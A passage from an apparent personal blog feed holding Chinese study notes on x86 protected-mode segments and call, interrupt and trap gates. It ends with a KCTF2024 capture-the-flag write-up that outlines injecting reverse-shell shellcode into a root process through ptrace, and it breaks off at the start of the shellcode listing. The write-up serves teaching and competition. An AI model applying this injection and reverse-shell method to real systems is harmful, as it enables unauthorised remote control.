    <content type="html"><![CDATA[<p>今天开始学习各种门与门描述符</p><span id="more"></span><p>先解决一下上节课的存疑。</p><h2 id="段选择子的检验"><a href="#段选择子的检验" class="headerlink" title="段选择子的检验"></a>段选择子的检验</h2><p>尝试将段选择子装入 CS 或 SS 时，会进行检查，通常会产生一个保护异常。而装入其它的段寄存器不会立即检查，会在尝试访问的时候检查权限。</p><hr><p>前面提到，段描述符当 <code>s=0</code> 时，是一个系统段，而系统段根据 TYPE 域的变化有如下的区别</p><img src="/2024/10/05/x86_2/1.png" class=""><p>其中就有各种各样的门描述符，包括调用门、中断门、陷阱门，门描述符的结构如下所示</p><img src="/2024/10/05/x86_2/2.png" class=""><h2 id="长调用和短调用，长跳转与短跳转"><a href="#长调用和短调用，长跳转与短跳转" class="headerlink" title="长调用和短调用，长跳转与短跳转"></a>长调用和短调用，长跳转与短跳转</h2><p>在学习调用门之前，先来了解一下长跳（jmp far），短跳（jmp）与长调用（call far），短调用（call）的区别。我们平时使用的比较多的指令其实都是短调用和短跳转，几乎很少用到长跳和长调用。长调用和长跳事实上会修改段寄存器 CS，CS不能通过一般的赋值指令修改，只能通过长调用或长跳修改。</p><p><strong>长跳不会改变进程 CPL，长调用会</strong>。</p><p>短跳：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jmp 立即数/寄存器/内存</span><br><span class="line">//仅修改 EIP</span><br></pre></td></tr></table></figure><p>长跳：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jmp far cs:eip</span><br><span class="line">//修改 EIP 和 CS</span><br></pre></td></tr></table></figure><p>事实上，长调用在现实情况中也很少见。</p><p>短调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call cs:eip</span><br><span class="line">//修改 esp，eip和内存</span><br></pre></td></tr></table></figure><p>长调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call far cs:eip （eip参数在这里不发挥作用）</span><br><span class="line">//修改 esp eip cs和内存，返回使用 retf</span><br></pre></td></tr></table></figure><h3 id="跨段不提权"><a href="#跨段不提权" class="headerlink" title="跨段不提权"></a>跨段不提权</h3><p>这里编写代码测试一下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="type">int</span> __declspec(naked)<span class="built_in">func</span>() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        retf;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, func);</span><br><span class="line">    <span class="type">char</span> bufcode[] = &#123; <span class="number">0x00</span>,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line">    *(<span class="type">int32_t</span>*)&amp;bufcode[<span class="number">0</span>] = (<span class="type">int32_t</span>)func;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        nop;</span><br><span class="line">        call fword ptr bufcode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下断点调试，进入之后可以发现在执行 call 的时候不但压入了 EIP，同时将段寄存器 CS 也压入栈中。</p><img src="/2024/10/05/x86_2/3.png" class=""><p>在 retf 之后，同样会将 EIP 和 CS 一块弹出来，恢复栈。</p><h3 id="跨段提权"><a href="#跨段提权" class="headerlink" title="跨段提权"></a>跨段提权</h3><p>通常是改变了进程自身的权限，至于前面提到了跨段之后提权，自然是会有一些校验的。对于用户层来说，我们跨段提权仅仅是修改 CS 和 EIP。如果我们修改了 CS 提权，同时能够任意指定 EIP，那将会产生很严重的安全漏洞。</p><p>因此，跨段调用提权需要通过调用门来进行，我们看到调用门描述符结构</p><img src="/2024/10/05/x86_2/2.png" class=""><ul><li>ParamCount 有五位，可以指定该调用门最多拥有31个参数。</li><li>TYPE&#x3D;C 表明是调用门。</li><li>P&#x3D;1表示有效。</li><li>S&#x3D;0表示为系统段。</li><li>DPL指示了该调用门需要请求的权限。</li><li>调用门还存储了新的段选择子指示该调用门调用之后 CS 新的值。</li><li>其余 32 位数据指示了新的 EIP 的位置。</li></ul><p>因此我们说跨段提权的情况中，EIP 被废弃，我们只需要指示 CS 为目标调用门即可，而目的地址则在对应的门描述符中，因此我们通过调用门来进行跨段提权无法指示目标代码的执行位置（至少在用户层）。</p><h2 id="调用门"><a href="#调用门" class="headerlink" title="调用门"></a>调用门</h2><h3 id="跨段提权具体过程"><a href="#跨段提权具体过程" class="headerlink" title="跨段提权具体过程"></a>跨段提权具体过程</h3><p>对于一致代码段而言，低级别的程序可以在不通过提升 CPL 的情况下访问。对于非一致代码段而言，禁止不同级别进行访问，要想访问则必须通过调用门先提升 CPL 再调用。</p><p>从上面分析我们可以总结调用门的执行过程（个人理解，难免有误，敬请指正），在调用 call far 的时候会进行如下操作：</p><ol><li>根据 CALL 给出的 CS 在 GDT 中找到对应的对描述符，CPU验证该段描述符是一个调用门描述符。</li><li>检查 CPL 与调用门 DPL 是否满足调用条件</li><li>将 SS 和 ESP 压栈。</li><li>取出调用门当中指定的新段选择子，给CS，当前 CS，EIP 压栈。</li><li>SS 会变为当前 CS+8 的值，此时栈会被切换。</li><li>栈切换之前，会根据 ParamCount 字段获取原栈中参数个数，并将它压入新的栈中。</li><li>将调用前的 CS，EIP也压入新的栈中。</li><li>根据 CS 新的段选择子的 Base + 调用门指定的 Offset 将 EIP 设置到指定的位置。</li></ol><p>这样就完成了跨段提权的过程。</p><h3 id="调用门权限检查"><a href="#调用门权限检查" class="headerlink" title="调用门权限检查"></a>调用门权限检查</h3><p>它会检查这几个字段</p><ul><li>CPL</li><li>门选择子 RPL（也就是你尝试 CALL 的所指定的门选择子的低2位）</li><li>调用门描述符 DPL</li><li>目标代码段 DPL</li></ul><p>同时还要检查目标代码段的一致性位。</p><p>与前面访问数据差不多，CALL 调用门权限要满足以下条件：</p><ul><li>CPL&lt;&#x3D;调用门DPL</li><li>RPL&lt;&#x3D;调用门DPL</li><li>目标代码段DPL&lt;&#x3D;CPL。</li></ul><p>这里会发现有点奇怪，为什么 CPL &gt;&#x3D; 目标代码段 DPL，这是为了防止通过调用门以高特权级去执行用户代码。也就是说，使用 <code>call far</code> 尝试调用调用门时，只允许向高特权级的代码去转移而不能向低特权级的代码转移。相对应的，<code>call far</code> 有对应的 <code>retf</code> 指令与之对应，但是 <code>retf</code> 只能向同权限或者低权限去转移。</p><p>对于 JMP 来说，除了满足前两个条件外，如果目标是非一致代码段，则不允许低权限的 CPL 进来访问，只允许同级访问，因为 <code>jmp far</code> 不会改变当前进程的 CPL。对于一致代码段，访问并不会受限，此时也不会改变当前进程的特权级。</p><p><code>retf</code> 指令它能确保跨段提权之后，恢复所有栈的情况，包括提权之后可能压入的 CS，EIP，SS，ESP以及参数的清理等。</p><h2 id="中断门与陷阱门"><a href="#中断门与陷阱门" class="headerlink" title="中断门与陷阱门"></a>中断门与陷阱门</h2><h3 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h3><p>中断（Interrupt）指的是当出现需要的时候，CPU放弃处理当前运行的程序转而去处理的过程。比如常见的除零（0号中断），断点（3号中断），系统调用（0x2e中断，Linux使用0x80中断）以及异常处理都会引发中断，调用相应的处理例程去处理中断事件。而操作系统需要维护这样的一个例程表，于是就有了 IDT。</p><p>中断门与调用门类似，也会指定新的段选择子和一个中断处理程序，所以中断门也可以用于提权，提权的规则与检测与调用门几乎相同，在某些细节有略微的差异。</p><h3 id="中断描述符表"><a href="#中断描述符表" class="headerlink" title="中断描述符表"></a>中断描述符表</h3><p>与gdt一样，同样有一个寄存器 IDTR 维护了一张中断描述符表（IDT），同样，该寄存器是 48 位的寄存器，存储了 IDT 表的位置（4字节）和大小（2字节），IDT的长度字段默认是 0x7FF，也就是IDT总长为 2048 字节，能够存入 256 个中断描述符。</p><p>IDT 主要存储三种门描述符</p><ul><li>任务门描述符</li><li>中断门描述符</li><li>陷阱门描述符</li></ul><p>中断描述符结构如下图所示</p><img src="/2024/10/05/x86_2/4.png" class=""><p>其中，TYPE 域的 D 位决定了它是 16 位（0）还是 32 位（1）的中断门。除了 ParamCount 字段，其余字段跟调用门几乎是一致的。</p><p>IDT可以存入以下三种描述符：</p><ol><li><strong>任务门描述符</strong>：用于任务切换，里面包含用于选择任务状态段（TSS）的段选择子。可以使用JMP或CALL指令通过任务门来切换到任务门所指向的任务，当CPU因为中断或异常转移到任务门时，也会切换到指定任务。</li><li><strong>中断门描述符</strong>：用于描述中断例程的入口。</li><li><strong>陷阱门描述符</strong>：用于描述异常处理例程的入口。</li></ol><h3 id="中断门调用过程"><a href="#中断门调用过程" class="headerlink" title="中断门调用过程"></a>中断门调用过程</h3><p>通过中断门进入处理程序有很多种方法，通过 <code>int xx</code> 指令进入应该属于熟知的方式，除此之外，以下行为均会通过中断门进入中断处理过程：</p><ul><li>int 指令</li><li>外部设备中断</li><li>软件异常</li></ul><p>同样，如果是跨段提权，那么需要进行栈切换，保存原 CS 等等操作，除此之外，需要额外保留原来的 EFLAGS，栈的情况如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|   SS   |   &lt;- 用户模式的栈段选择子</span><br><span class="line">|  ESP   |   &lt;- 用户模式的栈指针</span><br><span class="line">| EFLAGS |   &lt;- 标志寄存器</span><br><span class="line">|   CS   |   &lt;- 代码段选择子</span><br><span class="line">|   EIP  |   &lt;- 被中断的指令地址</span><br></pre></td></tr></table></figure><p>对应的，从中断处理程序返回使用 <code>iret</code> 指令返回到被中断的位置。<code>iret</code> 指令和 <code>retf</code> 一样，</p><p>可以完美地还原压栈的参数。</p><p>这里需要注意的是，<code>iret</code> 指令并不单单还原栈的参数，还会做一件事情，就是开中断。因为通过中断门调用进去之后，会屏蔽其它中断（ <code>eflags.TF=0</code>）。如果仅仅使用 <code>retf 4</code> 进行长返回的话，会导致应用层程序的 <code>eflags.TF=0</code>，如果此时它出现其它异常，会导致无法中断这个程序从而出现蓝屏。并且，<code>eflags.TF</code> 标志位无法在用户层修改，只能通过特权指令 <code>cli</code>（关中断）和 <code>sti</code>（开中断）去修改。</p><p>关中断指令只能屏蔽可屏蔽中断，电源掉电等不可屏蔽中断（NMI）CPU无法屏蔽,其它硬件也可以向CPU报告紧急事件，通过CPU的NMI引脚去触发，CPU一旦收到必须立刻处理。</p><h3 id="陷入"><a href="#陷入" class="headerlink" title="陷入"></a>陷入</h3><p>与中断几乎一样，唯一的区别是陷阱门调用之后不会关中断，也就是说它可以被其它中断打断。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1].<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_2">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_2</a></li><li>[2].<a href="https://www.cnblogs.com/onetrainee/p/12436327.html">https://www.cnblogs.com/onetrainee/p/12436327.html</a></li></ul>]]></content>
    
    
    <summary type="html">今天开始学习各种门与门描述符</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="x86架构" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/x86%E6%9E%B6%E6%9E%84/"/>
    
    <category term="保护模式" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/x86%E6%9E%B6%E6%9E%84/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>x86的保护模式（1）——段描述符与段寄存器</title>
    <link href="https://xia0ji233.github.io/2024/09/17/x86_1/"/>
    <id>https://xia0ji233.github.io/2024/09/17/x86_1/</id>
    <published>2024-09-17T09:00:00.000Z</published>
    <updated>2025-01-17T10:39:23.423Z</updated>
    
    <content type="html"><![CDATA[<p>重新把内核基础学一遍，方便后续学习的展开。</p><span id="more"></span><p>x86 是一个非常经典的复杂指令集架构（CISC），它的特点是指令不定长，解析指令时会根据头个字节甚至是第二个字节决定指令解析的长度，作为本篇学习的研究例子。</p><p>x86 的 CPU 在早期都是以<strong>实模式</strong>运行的，在 80386 及以后，x86 CPU 新增了分页的虚拟内存机制，同时在 80286 CPU 中就新增了其它运行模式，比如<strong>保护模式</strong>，本篇将重点学习<strong>保护模式</strong>。</p><h2 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h2><h3 id="CPU分级"><a href="#CPU分级" class="headerlink" title="CPU分级"></a>CPU分级</h3><p>只需要知道，数值上越小，权限越大。就像你的Linux root的 uid 就是0。CPU设计的时候是分了四级 ring 环，如图所示：</p><img src="/2024/09/17/x86_1/1.png" class=""><p>最外层是 ring3，是我们平时程序运行的等级，只能执行少数的非特权指令。ring0 是操作系统或者是驱动运行的等级，分级的目的就是防止应用程序随意篡改内核数据。内核数据的不正确修改往往会导致操作系统无法继续运行，Linux上会直接 crash 并强制关机，Windows 会蓝屏。</p><p>在CPU设计的时候，将 ring2 和 ring1给了驱动程序去运行，然而实际情况是，大部分操作系统没有使用 ring1 和 ring2，只使用了 ring0 和 ring3。所以在编写驱动的时候，驱动程序通常是直接运行在和操作系统同一等级 ring0 的。</p><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p>要理解保护模式，首先就得介绍一下段寄存器。</p><p>段寄存器主要有：CS，DS，SS，ES，FS，GS等等。最开始的实模式中，段寄存器的作用是做一个基址保存，因为当时 8086 的总线宽度为 20 位，寻址能力 1MB（2的20次方），但是寄存器却只有16位。于是 Intel 这么设计：16 位的段寄存器中的值 * 16 再加真实的 16 位寻址地址，得到了访问的真实地址，但是其中会有 12 位是重叠的。</p><ul><li>代码段寄存器CS与寄存器IP相配合获得当前线程代码执行到的内存位置；</li><li>数据段寄存器DS与各通用寄存器配合访问内存中的数据；</li><li>栈段寄存器SS与寄存器(E)SP、(E)BP配合访问线程的调用栈（call stack）；</li><li>扩展段寄存器ES用于特定字符串指令（如MOVS或CMPS）。</li></ul><p>随着技术的发展，段寄存器已经不是最初那个仅用来保存基址的寄存器了，但是它对用户来看，仍然是 16 位的寄存器。它的含义也有了很大的变化，分段，不仅要规定内存起始地址，目标长度，还有对应的操作权限，仅凭16位的段寄存器看起来是远远不够的（由于需要兼容早期版本的机器，段寄存器一直被设计为16位）。于是，属于我们用户层的段寄存器，就仅保存<strong>段选择子</strong>，其余信息保存在<strong>段描述符</strong>中。段描述符可以被存储在任何内存的位置，但是通常来说它在<strong>内核空间</strong>。</p><h3 id="GDT和LDT表"><a href="#GDT和LDT表" class="headerlink" title="GDT和LDT表"></a>GDT和LDT表</h3><p>上面提到了，段描述符是存储在内核空间的，内核空间负责维护了一张表，叫全局描述符表（GDT，Global Descriptor Table）。为了找到这张表，Intel 专门设计了一个寄存器 GDTR（Global Descriptor Table Register）来存储这张表的位置。</p><p>使用 LGDT 指令可以对 GDTR 寄存器做修改，当然，这也是特权指令，用户态无法直接调用。</p><p>除了 GDT，还允许程序员自行构建局部描述符表（LDT，Local Descriptor Table），它可以为每个进程构建一张段描述符表，另外，每一个LDT自身<strong>作为一个段</strong>存在，它们的段描述符被放在GDT中。LDT只是一个可选的数据结构，完全可以不用它，完全取决与操作系统的开发者意愿。实际上目前主流的 OS（Windows、Linux）中，很少出现 LDT 的身影，因为它们自身实现了很完整的分页管理机制，LDT 的实现可能的确对于内存管理有所方便，但还是和目前主流的 OS 设计观念不太相符（本人主观猜测）。</p><h3 id="段选择子-段描述符"><a href="#段选择子-段描述符" class="headerlink" title="段选择子&amp;段描述符"></a>段选择子&amp;段描述符</h3><p>前面提到了，段寄存器对于用户来说仅保存<strong>段选择子</strong>，通过<strong>段选择子</strong>所指示的信息可以找到对应的<strong>段描述符</strong>。先来看看段选择子的一个<strong>结构图</strong>：</p><img src="/2024/09/17/x86_1/2.png" class=""><p>最低的两位指示了CPU的请求特权等级（RPL，Request Privilege Level），猜测这里刚好对应 CPU 的四个环。</p><p>最低的第三位指示了该段的<strong>段描述符</strong>是查找 LDT 还是查找 GDT，如果为 0 表示查找 GDT。</p><p>其余指示了<strong>段描述符</strong>在 GDT 或者 LDT 的索引。</p><hr><p>段描述符的结构如图所示（以32位为例）：</p><img src="/2024/09/17/x86_1/3.png" class=""><p>它的成员有很多，一个一个来介绍：</p><ul><li><p>P位：段描述符是否有效</p></li><li><p>Base：被分成了三个部分，Base 的低16位被放置在低 4 个字节的前两个字节。高 16 位分别被分到了高四个字节的首尾字节。</p></li><li><p>Limit：段限长，可以发现只有 <code>16+4=20</code> 位，范围在 <code>1B~1MB</code>，但是它还有个 G 位，可以保证32位程序的段限长到 4GB。</p></li><li><p>G位：是否以页为单位。如果 <code>G=1</code>，那么段限长以页（4KB）为单位，否则以字节（B）为单位。这样就保证了，段限长最大可以达到 $2^{20}\times4\text{KB}&#x3D;4\text{GB}$。</p></li><li><p>S位：描述符是否为<strong>代码或数据</strong>段描述符。如果 <code>S=1</code>，则为代码或数据段描述符，否则为<strong>系统</strong>段描述符。</p></li><li><p>TYPE域：有四位的大小，比较复杂，根据 S 位具有不同的含义，在下面展开讲。</p></li></ul><p>当 <code>S=1</code> 时，为<strong>代码或者数据段描述符</strong>，具体如下图所示：</p><img src="/2024/09/17/x86_1/4.png" class=""><p>最高位显然是区分是否为代码段的，若为 1 则是<strong>代码段</strong>，其余还有五个位需要介绍。</p><ol><li>A：访问位，判断该段是否被访问过</li><li>E：向下扩展位，向下扩展表示段基址开始到段限长范围内的内存都可以访问，向上扩展则刚好相反，段基址到段限长之间的内存不能访问，其余可以访问。</li><li>R：可读位，表示是否可读。</li><li>W：可写位，表示是否可写（默认可读）。</li><li>C：一致位，后面将介绍一致位。</li></ol><p>如下图展示了向下扩展位和向上扩展位的区别，绿色块表示可访问，红色块表示不可访问。</p><img src="/2024/09/17/x86_1/5.png" class=""><p>当 <code>S=0</code> 时，为<strong>系统段描述符</strong>，TYPE域的具体如下所示：</p><img src="/2024/09/17/x86_1/6.png" class=""><p>下面接着讲段描述符相关的成员。。</p><ul><li>D&#x2F;B位：可以简单的理解为是 16 位和 32 位的一个区分。</li><li>DPL位：规定了访问这个段所需的权限。通常来说，当你的权限 &lt;&#x3D; 段权限时，访问才是允许的（这里数值越小，权限越高）。</li><li>AVL位：AVL指示是否可供系统软件使用，由操作系统来使用。</li></ul><p>也来看看 D 位的区别：</p><img src="/2024/09/17/x86_1/7.png" class=""><p>红色表示向下拓展能寻址的范围。可以看出，如果<code>D = 0</code>，就算原来能寻址<code>4GB</code>，因为DB位的限制导致最大范围是<code>64KB</code>。</p><h3 id="段权限"><a href="#段权限" class="headerlink" title="段权限"></a>段权限</h3><p>其实前面介绍的已经比较完整了，段权限被存储在两个位置，一个是<strong>段选择子</strong>，一个是<strong>段描述符</strong>，但是这里要介绍三种权限等级。</p><ol><li>当前特权级（CPL，Current Privilege Level），存储在代码段寄存器（段选择子）的低2位，表示了当前进程的特权等级。</li><li>请求特权级（RPL，Request Privilege Level），存储在其它段寄存器的低2位。表明了访问这个段所使用的权限。</li><li>段描述符特权级（DPL，Descriptor Privilege Level），存储在段描述符中，表明了访问这个段所需的特权等级。</li></ol><p>这里可能会对 RPL 和 DPL 有所分不清，想着这俩不都是对同一个段的描述么，为什么还要进行区分。这里需要说明，两个的区别，DPL表示了，你访问这个段最少需要多少的权限。RPL 则指示了，我访问这个段通过什么权限去访问。</p><p>比如一个 ring0 的程序，它的特权等级显然是 0，但是它要去访问一个低权限的段可以不用这么高的权限，我可以只使用 ring3 的权限，所以我只需要修改一下我请求的这个段的 RPL 就可以更改我访问的权限而不必修改自身的权限（CPL）。</p><p>这里再举一个通俗易懂的例子：</p><p>正国级（0），正部级（1），正厅级（2），正处级（3）。它们所能管辖的范围也有所不同，对应的分别是全国（0），省级（1），市级（2），县级（3）。CPL就相当于你个人的职级，行政单位的权限就相当于段特权等级（DPL）。RPL在里面就有点意思了，它不随前两个变化，随你心意。你身为省长，想去一个县里面的单位视察肯定没有问题，但是问题来了，你要以什么身份去视察呢？这个身份，就是你去视察的地方所使用的特权等级（RPL）。显而易见的，你所使用的请求特权等级，必须低于或者等于你自身的身份。因为大官冒充小官，说好听点叫微服私访，而小官冒充大官就涉嫌招摇撞骗了。</p><p>同样的，判断你能不能访问一个段，需要做两方面的检查，第一，判断你级别够不够，第二，判断你有没有招摇撞骗。即，在访问一个段时，作两个检查</p><ol><li>RPL&lt;&#x3D;DPL（判断级别够不够）</li><li>CPL&lt;&#x3D;RPL（判断是否招摇撞骗）</li></ol><p>如果都通过了，说明你是可以访问这个段的，否则就会引发段错误。</p><h3 id="一致性与非一致性"><a href="#一致性与非一致性" class="headerlink" title="一致性与非一致性"></a>一致性与非一致性</h3><ul><li>对于一致代码段:也就是共享的段.<ol><li>特权级高的程序不允许访问特权级低的数据:核心态不允许调用用户态的数据.</li><li>特权级低的程序可以访问到特权级高的数据.但是特权级不会改变:用户态还是用户态.</li></ol></li><li>对于普通代码段.也就是非一致代码段:<ol><li>只允许同级间访问.</li><li>绝对禁止不同级访问:核心态不用用户态.用户态也不使用核心态.</li></ol></li><li>对于数据段来说高特权允许访问低特权的数据而不允许低特权访问高特权的数据。</li></ul><p>总结：</p><p>非一致代码段只允许同级访问。</p><p>对于一致性的段，一般情况下认为内核代码是完善的，不容易出错的，用户层的代码是不完善的，极容易出错的。因此允许用户调用内核提供的代码，而不允许内核调用用户的代码。</p><p>对于一致性的数据段，一般情况下认为内核的数据很私密，不能够随便让应用程序读取。而操作系统对用户的数据应当有知情权，不论是为了调试还是管理，都应当有知情权。</p><p>可以总结出以下表</p><table><thead><tr><th></th><th>向高特权请求</th><th>向低特权请求</th><th>同级请求</th><th>适用性</th></tr></thead><tbody><tr><td>一致代码段</td><td>Y</td><td>N</td><td>Y</td><td>共享库函数，暴漏的内核接口</td></tr><tr><td>非一致代码段</td><td>N</td><td>N</td><td>Y</td><td>避免低特权级的程序执行的代码</td></tr><tr><td>数据段</td><td>N</td><td>Y</td><td>Y</td><td>*</td></tr></tbody></table><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>（注：引用不分先后）</p><ul><li>[1]：<a href="https://www.cnblogs.com/johnnyflute/p/3564894.html">https://www.cnblogs.com/johnnyflute/p/3564894.html</a></li><li>[2]：<a href="https://zh.wikipedia.org/wiki/X86%E8%A8%98%E6%86%B6%E9%AB%94%E5%8D%80%E6%AE%B5">https://zh.wikipedia.org/wiki/X86記憶體區段</a></li><li>[3]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_1">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_1</a></li><li>[4]：<a href="https://www.cnblogs.com/wingsummer/p/15312627.html">https://www.cnblogs.com/wingsummer/p/15312627.html</a></li></ul>]]></content>
    
    
    <summary type="html">重新把内核基础学一遍，方便后续学习的展开。</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="x86架构" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/x86%E6%9E%B6%E6%9E%84/"/>
    
    <category term="保护模式" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/x86%E6%9E%B6%E6%9E%84/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>KCTF2024第八题 writeup</title>
    <link href="https://xia0ji233.github.io/2024/09/02/KCTF2024/"/>
    <id>https://xia0ji233.github.io/2024/09/02/KCTF2024/</id>
    <published>2024-09-02T12:00:00.000Z</published>
    <updated>2025-01-19T15:44:40.337Z</updated>
    
    <content type="html"><![CDATA[<p>KCTF2024第八题——星门 writeup</p><span id="more"></span><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>拿到题目，是一道典型的写shellcode的题目，白名单系统调用，只允许 read，wait4 和 ptrace。</p><img src="/2024/09/02/KCTF2024/1.png" class=""><p>沙箱系统调用号白名单首先想到了切架构，但是它题目也有判断架构。因此就只能利用这个 ptrace 去做文章了。</p><p>其次应当考虑信息以何种方式回传，因为原进程是连write都不能用的，侧信道也没法，所以便起了一个docker环境去试试。发现启动脚本中。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DO NOT DELETE</span></span><br><span class="line">/etc/init.d/xinetd start;</span><br><span class="line"><span class="built_in">sleep</span> infinity;</span><br></pre></td></tr></table></figure><p>​于是选择让队友先起一个docker环境，然后观察里面可以使用的进程。</p><img src="/2024/09/02/KCTF2024/2.png" class=""><p>发现了进程 <code>sleep infinity</code>，并且占用的 pid 始终保持 20 以内，并且脚本启动就是 root 权限，不用担心附加不上的问题。</p><p>最后要去尝试的一点就是该靶机是否出网，静态编译一个 socket 请求对外连接发现完全可行，因此考虑反弹 shell。</p><h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>于是开始着手写 shellcode，先写可以反弹shell的shellcode，这个shellcode是我们要注入到目标进程的。这里为了保证shellcode正确，先编译一个 demo 尝试。</p><p>反弹 shell 用汇编去描述其实也非常简单。首先，反弹shell的步骤如下：</p><ol><li>起一个socket套接字</li><li>连接远程服务器</li><li>将标准输入，标准输出，标准错误描述符都重定向到这个套接字描述符。</li><li>execve 运行一个 shell 程序。</li></ol><p>这四个步骤分别可以对应</p><ol><li>socket</li><li>connect</li><li>dup2</li><li>execve</li></ol><p>这四个系统调用，稍微了解一下，把参数一传，就可以达到反弹 shell 的目的。</p><p>最终我的 shellcode 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">mov edi,1</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdx,0x30</span><br><span class="line">mov eax,1</span><br><span class="line">syscall</span><br><span class="line">/*socket(AF_INET,SOCK_STREAM,0)*/</span><br><span 